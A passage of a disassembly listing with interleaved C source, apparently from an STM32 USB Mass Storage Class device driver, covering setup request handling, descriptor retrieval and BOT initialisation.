 8008f66:	693b      	ldr	r3, [r7, #16]
 8008f68:	2b00      	cmp	r3, #0
 8008f6a:	d101      	bne.n	8008f70 <USBD_MSC_Setup+0x2c>
  {
    return (uint8_t)USBD_FAIL;
 8008f6c:	2303      	movs	r3, #3
 8008f6e:	e0e1      	b.n	8009134 <USBD_MSC_Setup+0x1f0>
  }

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 8008f70:	683b      	ldr	r3, [r7, #0]
 8008f72:	781b      	ldrb	r3, [r3, #0]
 8008f74:	f003 0360 	and.w	r3, r3, #96	; 0x60
 8008f78:	2b00      	cmp	r3, #0
 8008f7a:	d053      	beq.n	8009024 <USBD_MSC_Setup+0xe0>
 8008f7c:	2b20      	cmp	r3, #32
 8008f7e:	f040 80d1 	bne.w	8009124 <USBD_MSC_Setup+0x1e0>
  {
    /* Class request */
    case USB_REQ_TYPE_CLASS:
      switch (req->bRequest)
 8008f82:	683b      	ldr	r3, [r7, #0]
 8008f84:	785b      	ldrb	r3, [r3, #1]
 8008f86:	2bfe      	cmp	r3, #254	; 0xfe
 8008f88:	d002      	beq.n	8008f90 <USBD_MSC_Setup+0x4c>
 8008f8a:	2bff      	cmp	r3, #255	; 0xff
 8008f8c:	d02a      	beq.n	8008fe4 <USBD_MSC_Setup+0xa0>
 8008f8e:	e041      	b.n	8009014 <USBD_MSC_Setup+0xd0>
      {
        case BOT_GET_MAX_LUN:
          if ((req->wValue  == 0U) && (req->wLength == 1U) &&
 8008f90:	683b      	ldr	r3, [r7, #0]
 8008f92:	885b      	ldrh	r3, [r3, #2]
 8008f94:	2b00      	cmp	r3, #0
 8008f96:	d11e      	bne.n	8008fd6 <USBD_MSC_Setup+0x92>
 8008f98:	683b      	ldr	r3, [r7, #0]
 8008f9a:	88db      	ldrh	r3, [r3, #6]
 8008f9c:	2b01      	cmp	r3, #1
 8008f9e:	d11a      	bne.n	8008fd6 <USBD_MSC_Setup+0x92>
              ((req->bmRequest & 0x80U) == 0x80U))
 8008fa0:	683b      	ldr	r3, [r7, #0]
 8008fa2:	781b      	ldrb	r3, [r3, #0]
 8008fa4:	b25b      	sxtb	r3, r3
          if ((req->wValue  == 0U) && (req->wLength == 1U) &&
 8008fa6:	2b00      	cmp	r3, #0
 8008fa8:	da15      	bge.n	8008fd6 <USBD_MSC_Setup+0x92>
          {
            hmsc->max_lun = (uint32_t)((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetMaxLun();
 8008faa:	687b      	ldr	r3, [r7, #4]
 8008fac:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008fb0:	687a      	ldr	r2, [r7, #4]
 8008fb2:	33b0      	adds	r3, #176	; 0xb0
 8008fb4:	009b      	lsls	r3, r3, #2
 8008fb6:	4413      	add	r3, r2
 8008fb8:	685b      	ldr	r3, [r3, #4]
 8008fba:	699b      	ldr	r3, [r3, #24]
 8008fbc:	4798      	blx	r3
 8008fbe:	4603      	mov	r3, r0
 8008fc0:	461a      	mov	r2, r3
 8008fc2:	693b      	ldr	r3, [r7, #16]
 8008fc4:	601a      	str	r2, [r3, #0]
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hmsc->max_lun, 1U);
 8008fc6:	693b      	ldr	r3, [r7, #16]
 8008fc8:	2201      	movs	r2, #1
 8008fca:	4619      	mov	r1, r3
 8008fcc:	6878      	ldr	r0, [r7, #4]
 8008fce:	f003 f979 	bl	800c2c4 <USBD_CtlSendData>
 8008fd2:	bf00      	nop
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008fd4:	e025      	b.n	8009022 <USBD_MSC_Setup+0xde>
            USBD_CtlError(pdev, req);
 8008fd6:	6839      	ldr	r1, [r7, #0]
 8008fd8:	6878      	ldr	r0, [r7, #4]
 8008fda:	f003 f902 	bl	800c1e2 <USBD_CtlError>
            ret = USBD_FAIL;
 8008fde:	2303      	movs	r3, #3
 8008fe0:	75fb      	strb	r3, [r7, #23]
          break;
 8008fe2:	e01e      	b.n	8009022 <USBD_MSC_Setup+0xde>

        case BOT_RESET :
          if ((req->wValue  == 0U) && (req->wLength == 0U) &&
 8008fe4:	683b      	ldr	r3, [r7, #0]
 8008fe6:	885b      	ldrh	r3, [r3, #2]
 8008fe8:	2b00      	cmp	r3, #0
 8008fea:	d10c      	bne.n	8009006 <USBD_MSC_Setup+0xc2>
 8008fec:	683b      	ldr	r3, [r7, #0]
 8008fee:	88db      	ldrh	r3, [r3, #6]
 8008ff0:	2b00      	cmp	r3, #0
 8008ff2:	d108      	bne.n	8009006 <USBD_MSC_Setup+0xc2>
              ((req->bmRequest & 0x80U) != 0x80U))
 8008ff4:	683b      	ldr	r3, [r7, #0]
 8008ff6:	781b      	ldrb	r3, [r3, #0]
 8008ff8:	b25b      	sxtb	r3, r3
          if ((req->wValue  == 0U) && (req->wLength == 0U) &&
 8008ffa:	2b00      	cmp	r3, #0
 8008ffc:	db03      	blt.n	8009006 <USBD_MSC_Setup+0xc2>
          {
            MSC_BOT_Reset(pdev);
 8008ffe:	6878      	ldr	r0, [r7, #4]
 8009000:	f000 f9bc 	bl	800937c <MSC_BOT_Reset>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8009004:	e00d      	b.n	8009022 <USBD_MSC_Setup+0xde>
            USBD_CtlError(pdev, req);
 8009006:	6839      	ldr	r1, [r7, #0]
 8009008:	6878      	ldr	r0, [r7, #4]
 800900a:	f003 f8ea 	bl	800c1e2 <USBD_CtlError>
            ret = USBD_FAIL;
 800900e:	2303      	movs	r3, #3
 8009010:	75fb      	strb	r3, [r7, #23]
          break;
 8009012:	e006      	b.n	8009022 <USBD_MSC_Setup+0xde>

        default:
          USBD_CtlError(pdev, req);
 8009014:	6839      	ldr	r1, [r7, #0]
 8009016:	6878      	ldr	r0, [r7, #4]
 8009018:	f003 f8e3 	bl	800c1e2 <USBD_CtlError>
          ret = USBD_FAIL;
 800901c:	2303      	movs	r3, #3
 800901e:	75fb      	strb	r3, [r7, #23]
          break;
 8009020:	bf00      	nop
      }
      break;
 8009022:	e086      	b.n	8009132 <USBD_MSC_Setup+0x1ee>
    /* Interface & Endpoint request */
    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 8009024:	683b      	ldr	r3, [r7, #0]
 8009026:	785b      	ldrb	r3, [r3, #1]
 8009028:	2b0b      	cmp	r3, #11
 800902a:	d872      	bhi.n	8009112 <USBD_MSC_Setup+0x1ce>
 800902c:	a201      	add	r2, pc, #4	; (adr r2, 8009034 <USBD_MSC_Setup+0xf0>)
 800902e:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8009032:	bf00      	nop
 8009034:	08009065 	.word	0x08009065
 8009038:	080090e1 	.word	0x080090e1
 800903c:	08009113 	.word	0x08009113
 8009040:	08009113 	.word	0x08009113
 8009044:	08009113 	.word	0x08009113
 8009048:	08009113 	.word	0x08009113
 800904c:	08009113 	.word	0x08009113
 8009050:	08009113 	.word	0x08009113
 8009054:	08009113 	.word	0x08009113
 8009058:	08009113 	.word	0x08009113
 800905c:	0800908f 	.word	0x0800908f
 8009060:	080090b9 	.word	0x080090b9
      {
        case USB_REQ_GET_STATUS:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8009064:	687b      	ldr	r3, [r7, #4]
 8009066:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800906a:	b2db      	uxtb	r3, r3
 800906c:	2b03      	cmp	r3, #3
 800906e:	d107      	bne.n	8009080 <USBD_MSC_Setup+0x13c>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&status_info, 2U);
 8009070:	f107 030e 	add.w	r3, r7, #14
 8009074:	2202      	movs	r2, #2
 8009076:	4619      	mov	r1, r3
 8009078:	6878      	ldr	r0, [r7, #4]
 800907a:	f003 f923 	bl	800c2c4 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 800907e:	e050      	b.n	8009122 <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 8009080:	6839      	ldr	r1, [r7, #0]
 8009082:	6878      	ldr	r0, [r7, #4]
 8009084:	f003 f8ad 	bl	800c1e2 <USBD_CtlError>
            ret = USBD_FAIL;
 8009088:	2303      	movs	r3, #3
 800908a:	75fb      	strb	r3, [r7, #23]
          break;
 800908c:	e049      	b.n	8009122 <USBD_MSC_Setup+0x1de>

        case USB_REQ_GET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800908e:	687b      	ldr	r3, [r7, #4]
 8009090:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8009094:	b2db      	uxtb	r3, r3
 8009096:	2b03      	cmp	r3, #3
 8009098:	d107      	bne.n	80090aa <USBD_MSC_Setup+0x166>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hmsc->interface, 1U);
 800909a:	693b      	ldr	r3, [r7, #16]
 800909c:	3304      	adds	r3, #4
 800909e:	2201      	movs	r2, #1
 80090a0:	4619      	mov	r1, r3
 80090a2:	6878      	ldr	r0, [r7, #4]
 80090a4:	f003 f90e 	bl	800c2c4 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 80090a8:	e03b      	b.n	8009122 <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 80090aa:	6839      	ldr	r1, [r7, #0]
 80090ac:	6878      	ldr	r0, [r7, #4]
 80090ae:	f003 f898 	bl	800c1e2 <USBD_CtlError>
            ret = USBD_FAIL;
 80090b2:	2303      	movs	r3, #3
 80090b4:	75fb      	strb	r3, [r7, #23]
          break;
 80090b6:	e034      	b.n	8009122 <USBD_MSC_Setup+0x1de>

        case USB_REQ_SET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 80090b8:	687b      	ldr	r3, [r7, #4]
 80090ba:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 80090be:	b2db      	uxtb	r3, r3
 80090c0:	2b03      	cmp	r3, #3
 80090c2:	d106      	bne.n	80090d2 <USBD_MSC_Setup+0x18e>
          {
            hmsc->interface = (uint8_t)(req->wValue);
 80090c4:	683b      	ldr	r3, [r7, #0]
 80090c6:	885b      	ldrh	r3, [r3, #2]
 80090c8:	b2db      	uxtb	r3, r3
 80090ca:	461a      	mov	r2, r3
 80090cc:	693b      	ldr	r3, [r7, #16]
 80090ce:	605a      	str	r2, [r3, #4]
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 80090d0:	e027      	b.n	8009122 <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 80090d2:	6839      	ldr	r1, [r7, #0]
 80090d4:	6878      	ldr	r0, [r7, #4]
 80090d6:	f003 f884 	bl	800c1e2 <USBD_CtlError>
            ret = USBD_FAIL;
 80090da:	2303      	movs	r3, #3
 80090dc:	75fb      	strb	r3, [r7, #23]
          break;
 80090de:	e020      	b.n	8009122 <USBD_MSC_Setup+0x1de>

        case USB_REQ_CLEAR_FEATURE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 80090e0:	687b      	ldr	r3, [r7, #4]
 80090e2:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 80090e6:	b2db      	uxtb	r3, r3
 80090e8:	2b03      	cmp	r3, #3
 80090ea:	d119      	bne.n	8009120 <USBD_MSC_Setup+0x1dc>
          {
            if (req->wValue == USB_FEATURE_EP_HALT)
 80090ec:	683b      	ldr	r3, [r7, #0]
 80090ee:	885b      	ldrh	r3, [r3, #2]
 80090f0:	2b00      	cmp	r3, #0
 80090f2:	d115      	bne.n	8009120 <USBD_MSC_Setup+0x1dc>
            {
              /* Flush the FIFO */
              (void)USBD_LL_FlushEP(pdev, (uint8_t)req->wIndex);
 80090f4:	683b      	ldr	r3, [r7, #0]
 80090f6:	889b      	ldrh	r3, [r3, #4]
 80090f8:	b2db      	uxtb	r3, r3
 80090fa:	4619      	mov	r1, r3
 80090fc:	6878      	ldr	r0, [r7, #4]
 80090fe:	f003 fdad 	bl	800cc5c <USBD_LL_FlushEP>

              /* Handle BOT error */
              MSC_BOT_CplClrFeature(pdev, (uint8_t)req->wIndex);
 8009102:	683b      	ldr	r3, [r7, #0]
 8009104:	889b      	ldrh	r3, [r3, #4]
 8009106:	b2db      	uxtb	r3, r3
 8009108:	4619      	mov	r1, r3
 800910a:	6878      	ldr	r0, [r7, #4]
 800910c:	f000 fb54 	bl	80097b8 <MSC_BOT_CplClrFeature>
            }
          }
          break;
 8009110:	e006      	b.n	8009120 <USBD_MSC_Setup+0x1dc>

        default:
          USBD_CtlError(pdev, req);
 8009112:	6839      	ldr	r1, [r7, #0]
 8009114:	6878      	ldr	r0, [r7, #4]
 8009116:	f003 f864 	bl	800c1e2 <USBD_CtlError>
          ret = USBD_FAIL;
 800911a:	2303      	movs	r3, #3
 800911c:	75fb      	strb	r3, [r7, #23]
          break;
 800911e:	e000      	b.n	8009122 <USBD_MSC_Setup+0x1de>
          break;
 8009120:	bf00      	nop
      }
      break;
 8009122:	e006      	b.n	8009132 <USBD_MSC_Setup+0x1ee>

    default:
      USBD_CtlError(pdev, req);
 8009124:	6839      	ldr	r1, [r7, #0]
 8009126:	6878      	ldr	r0, [r7, #4]
 8009128:	f003 f85b 	bl	800c1e2 <USBD_CtlError>
      ret = USBD_FAIL;
 800912c:	2303      	movs	r3, #3
 800912e:	75fb      	strb	r3, [r7, #23]
      break;
 8009130:	bf00      	nop
  }

  return (uint8_t)ret;
 8009132:	7dfb      	ldrb	r3, [r7, #23]
}
 8009134:	4618      	mov	r0, r3
 8009136:	3718      	adds	r7, #24
 8009138:	46bd      	mov	sp, r7
 800913a:	bd80      	pop	{r7, pc}

0800913c <USBD_MSC_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
uint8_t USBD_MSC_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 800913c:	b580      	push	{r7, lr}
 800913e:	b082      	sub	sp, #8
 8009140:	af00      	add	r7, sp, #0
 8009142:	6078      	str	r0, [r7, #4]
 8009144:	460b      	mov	r3, r1
 8009146:	70fb      	strb	r3, [r7, #3]
  MSC_BOT_DataIn(pdev, epnum);
 8009148:	78fb      	ldrb	r3, [r7, #3]
 800914a:	4619      	mov	r1, r3
 800914c:	6878      	ldr	r0, [r7, #4]
 800914e:	f000 f961 	bl	8009414 <MSC_BOT_DataIn>

  return (uint8_t)USBD_OK;
 8009152:	2300      	movs	r3, #0
}
 8009154:	4618      	mov	r0, r3
 8009156:	3708      	adds	r7, #8
 8009158:	46bd      	mov	sp, r7
 800915a:	bd80      	pop	{r7, pc}

0800915c <USBD_MSC_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
uint8_t USBD_MSC_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 800915c:	b580      	push	{r7, lr}
 800915e:	b082      	sub	sp, #8
 8009160:	af00      	add	r7, sp, #0
 8009162:	6078      	str	r0, [r7, #4]
 8009164:	460b      	mov	r3, r1
 8009166:	70fb      	strb	r3, [r7, #3]
  MSC_BOT_DataOut(pdev, epnum);
 8009168:	78fb      	ldrb	r3, [r7, #3]
 800916a:	4619      	mov	r1, r3
 800916c:	6878      	ldr	r0, [r7, #4]
 800916e:	f000 f98d 	bl	800948c <MSC_BOT_DataOut>

  return (uint8_t)USBD_OK;
 8009172:	2300      	movs	r3, #0
}
 8009174:	4618      	mov	r0, r3
 8009176:	3708      	adds	r7, #8
 8009178:	46bd      	mov	sp, r7
 800917a:	bd80      	pop	{r7, pc}

0800917c <USBD_MSC_GetHSCfgDesc>:
  *         return configuration descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetHSCfgDesc(uint16_t *length)
{
 800917c:	b580      	push	{r7, lr}
 800917e:	b084      	sub	sp, #16
 8009180:	af00      	add	r7, sp, #0
 8009182:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 8009184:	2181      	movs	r1, #129	; 0x81
 8009186:	4812      	ldr	r0, [pc, #72]	; (80091d0 <USBD_MSC_GetHSCfgDesc+0x54>)
 8009188:	f002 f9c8 	bl	800b51c <USBD_GetEpDesc>
 800918c:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 800918e:	2101      	movs	r1, #1
 8009190:	480f      	ldr	r0, [pc, #60]	; (80091d0 <USBD_MSC_GetHSCfgDesc+0x54>)
 8009192:	f002 f9c3 	bl	800b51c <USBD_GetEpDesc>
 8009196:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8009198:	68fb      	ldr	r3, [r7, #12]
 800919a:	2b00      	cmp	r3, #0
 800919c:	d006      	beq.n	80091ac <USBD_MSC_GetHSCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_HS_PACKET;
 800919e:	68fb      	ldr	r3, [r7, #12]
 80091a0:	2200      	movs	r2, #0
 80091a2:	711a      	strb	r2, [r3, #4]
 80091a4:	2200      	movs	r2, #0
 80091a6:	f042 0202 	orr.w	r2, r2, #2
 80091aa:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 80091ac:	68bb      	ldr	r3, [r7, #8]
 80091ae:	2b00      	cmp	r3, #0
 80091b0:	d006      	beq.n	80091c0 <USBD_MSC_GetHSCfgDesc+0x44>
  {
    pEpOutDesc->wMaxPacketSize = MSC_MAX_HS_PACKET;
 80091b2:	68bb      	ldr	r3, [r7, #8]
 80091b4:	2200      	movs	r2, #0
 80091b6:	711a      	strb	r2, [r3, #4]
 80091b8:	2200      	movs	r2, #0
 80091ba:	f042 0202 	orr.w	r2, r2, #2
 80091be:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 80091c0:	687b      	ldr	r3, [r7, #4]
 80091c2:	2220      	movs	r2, #32
 80091c4:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 80091c6:	4b02      	ldr	r3, [pc, #8]	; (80091d0 <USBD_MSC_GetHSCfgDesc+0x54>)
}
 80091c8:	4618      	mov	r0, r3
 80091ca:	3710      	adds	r7, #16
 80091cc:	46bd      	mov	sp, r7
 80091ce:	bd80      	pop	{r7, pc}
 80091d0:	200000e0 	.word	0x200000e0

080091d4 <USBD_MSC_GetFSCfgDesc>:
  *         return configuration descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetFSCfgDesc(uint16_t *length)
{
 80091d4:	b580      	push	{r7, lr}
 80091d6:	b084      	sub	sp, #16
 80091d8:	af00      	add	r7, sp, #0
 80091da:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 80091dc:	2181      	movs	r1, #129	; 0x81
 80091de:	4812      	ldr	r0, [pc, #72]	; (8009228 <USBD_MSC_GetFSCfgDesc+0x54>)
 80091e0:	f002 f99c 	bl	800b51c <USBD_GetEpDesc>
 80091e4:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 80091e6:	2101      	movs	r1, #1
 80091e8:	480f      	ldr	r0, [pc, #60]	; (8009228 <USBD_MSC_GetFSCfgDesc+0x54>)
 80091ea:	f002 f997 	bl	800b51c <USBD_GetEpDesc>
 80091ee:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 80091f0:	68fb      	ldr	r3, [r7, #12]
 80091f2:	2b00      	cmp	r3, #0
 80091f4:	d006      	beq.n	8009204 <USBD_MSC_GetFSCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 80091f6:	68fb      	ldr	r3, [r7, #12]
 80091f8:	2200      	movs	r2, #0
 80091fa:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 80091fe:	711a      	strb	r2, [r3, #4]
 8009200:	2200      	movs	r2, #0
 8009202:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 8009204:	68bb      	ldr	r3, [r7, #8]
 8009206:	2b00      	cmp	r3, #0
 8009208:	d006      	beq.n	8009218 <USBD_MSC_GetFSCfgDesc+0x44>
  {
    pEpOutDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 800920a:	68bb      	ldr	r3, [r7, #8]
 800920c:	2200      	movs	r2, #0
 800920e:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 8009212:	711a      	strb	r2, [r3, #4]
 8009214:	2200      	movs	r2, #0
 8009216:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 8009218:	687b      	ldr	r3, [r7, #4]
 800921a:	2220      	movs	r2, #32
 800921c:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 800921e:	4b02      	ldr	r3, [pc, #8]	; (8009228 <USBD_MSC_GetFSCfgDesc+0x54>)
}
 8009220:	4618      	mov	r0, r3
 8009222:	3710      	adds	r7, #16
 8009224:	46bd      	mov	sp, r7
 8009226:	bd80      	pop	{r7, pc}
 8009228:	200000e0 	.word	0x200000e0

0800922c <USBD_MSC_GetOtherSpeedCfgDesc>:
  *         return other speed configuration descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetOtherSpeedCfgDesc(uint16_t *length)
{
 800922c:	b580      	push	{r7, lr}
 800922e:	b084      	sub	sp, #16
 8009230:	af00      	add	r7, sp, #0
 8009232:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 8009234:	2181      	movs	r1, #129	; 0x81
 8009236:	4812      	ldr	r0, [pc, #72]	; (8009280 <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
 8009238:	f002 f970 	bl	800b51c <USBD_GetEpDesc>
 800923c:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 800923e:	2101      	movs	r1, #1
 8009240:	480f      	ldr	r0, [pc, #60]	; (8009280 <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
 8009242:	f002 f96b 	bl	800b51c <USBD_GetEpDesc>
 8009246:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8009248:	68fb      	ldr	r3, [r7, #12]
 800924a:	2b00      	cmp	r3, #0
 800924c:	d006      	beq.n	800925c <USBD_MSC_GetOtherSpeedCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 800924e:	68fb      	ldr	r3, [r7, #12]
 8009250:	2200      	movs	r2, #0
 8009252:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 8009256:	711a      	strb	r2, [r3, #4]
 8009258:	2200      	movs	r2, #0
 800925a:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 800925c:	68bb      	ldr	r3, [r7, #8]
 800925e:	2b00      	cmp	r3, #0
 8009260:	d006      	beq.n	8009270 <USBD_MSC_GetOtherSpeedCfgDesc+0x44>
  {
    pEpOutDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 8009262:	68bb      	ldr	r3, [r7, #8]
 8009264:	2200      	movs	r2, #0
 8009266:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 800926a:	711a      	strb	r2, [r3, #4]
 800926c:	2200      	movs	r2, #0
 800926e:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 8009270:	687b      	ldr	r3, [r7, #4]
 8009272:	2220      	movs	r2, #32
 8009274:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 8009276:	4b02      	ldr	r3, [pc, #8]	; (8009280 <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
}
 8009278:	4618      	mov	r0, r3
 800927a:	3710      	adds	r7, #16
 800927c:	46bd      	mov	sp, r7
 800927e:	bd80      	pop	{r7, pc}
 8009280:	200000e0 	.word	0x200000e0

08009284 <USBD_MSC_GetDeviceQualifierDescriptor>:
  *         return Device Qualifier descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetDeviceQualifierDescriptor(uint16_t *length)
{
 8009284:	b480      	push	{r7}
 8009286:	b083      	sub	sp, #12
 8009288:	af00      	add	r7, sp, #0
 800928a:	6078      	str	r0, [r7, #4]
  *length = (uint16_t)sizeof(USBD_MSC_DeviceQualifierDesc);
 800928c:	687b      	ldr	r3, [r7, #4]
 800928e:	220a      	movs	r2, #10
 8009290:	801a      	strh	r2, [r3, #0]

  return USBD_MSC_DeviceQualifierDesc;
 8009292:	4b03      	ldr	r3, [pc, #12]	; (80092a0 <USBD_MSC_GetDeviceQualifierDescriptor+0x1c>)
}
 8009294:	4618      	mov	r0, r3
 8009296:	370c      	adds	r7, #12
 8009298:	46bd      	mov	sp, r7
 800929a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800929e:	4770      	bx	lr
 80092a0:	20000100 	.word	0x20000100

080092a4 <USBD_MSC_RegisterStorage>:
  * @brief  USBD_MSC_RegisterStorage
  * @param  fops: storage callback
  * @retval status
  */
uint8_t USBD_MSC_RegisterStorage(USBD_HandleTypeDef *pdev, USBD_StorageTypeDef *fops)
{
 80092a4:	b480      	push	{r7}
 80092a6:	b083      	sub	sp, #12
 80092a8:	af00      	add	r7, sp, #0
 80092aa:	6078      	str	r0, [r7, #4]
 80092ac:	6039      	str	r1, [r7, #0]
  if (fops == NULL)
 80092ae:	683b      	ldr	r3, [r7, #0]
 80092b0:	2b00      	cmp	r3, #0
 80092b2:	d101      	bne.n	80092b8 <USBD_MSC_RegisterStorage+0x14>
  {
    return (uint8_t)USBD_FAIL;
 80092b4:	2303      	movs	r3, #3
 80092b6:	e009      	b.n	80092cc <USBD_MSC_RegisterStorage+0x28>
  }

  pdev->pUserData[pdev->classId] = fops;
 80092b8:	687b      	ldr	r3, [r7, #4]
 80092ba:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 80092be:	687a      	ldr	r2, [r7, #4]
 80092c0:	33b0      	adds	r3, #176	; 0xb0
 80092c2:	009b      	lsls	r3, r3, #2
 80092c4:	4413      	add	r3, r2
 80092c6:	683a      	ldr	r2, [r7, #0]
 80092c8:	605a      	str	r2, [r3, #4]

  return (uint8_t)USBD_OK;
 80092ca:	2300      	movs	r3, #0
}
 80092cc:	4618      	mov	r0, r3
 80092ce:	370c      	adds	r7, #12
 80092d0:	46bd      	mov	sp, r7
 80092d2:	f85d 7b04 	ldr.w	r7, [sp], #4
 80092d6:	4770      	bx	lr

080092d8 <MSC_BOT_Init>:
  *         Initialize the BOT Process
  * @param  pdev: device instance
  * @retval None
  */
void MSC_BOT_Init(USBD_HandleTypeDef *pdev)
{
 80092d8:	b580      	push	{r7, lr}
 80092da:	b084      	sub	sp, #16
 80092dc:	af00      	add	r7, sp, #0
 80092de:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80092e0:	687b      	ldr	r3, [r7, #4]
 80092e2:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80092e6:	687b      	ldr	r3, [r7, #4]
 80092e8:	32b0      	adds	r2, #176	; 0xb0
 80092ea:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80092ee:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 80092f0:	68fb      	ldr	r3, [r7, #12]
 80092f2:	2b00      	cmp	r3, #0
 80092f4:	d039      	beq.n	800936a <MSC_BOT_Init+0x92>
  {
    return;
  }

  hmsc->bot_state = USBD_BOT_IDLE;
 80092f6:	68fb      	ldr	r3, [r7, #12]
 80092f8:	2200      	movs	r2, #0
 80092fa:	721a      	strb	r2, [r3, #8]
  hmsc->bot_status = USBD_BOT_STATUS_NORMAL;
 80092fc:	68fb      	ldr	r3, [r7, #12]
 80092fe:	2200      	movs	r2, #0
 8009300:	725a      	strb	r2, [r3, #9]

  hmsc->scsi_sense_tail = 0U;
 8009302:	68fb      	ldr	r3, [r7, #12]
 8009304:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009308:	2200      	movs	r2, #0
 800930a:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61
  hmsc->scsi_sense_head = 0U;
 800930e:	68fb      	ldr	r3, [r7, #12]
 8009310:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009314:	2200      	movs	r2, #0
 8009316:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60
  hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800931a:	68fb      	ldr	r3, [r7, #12]
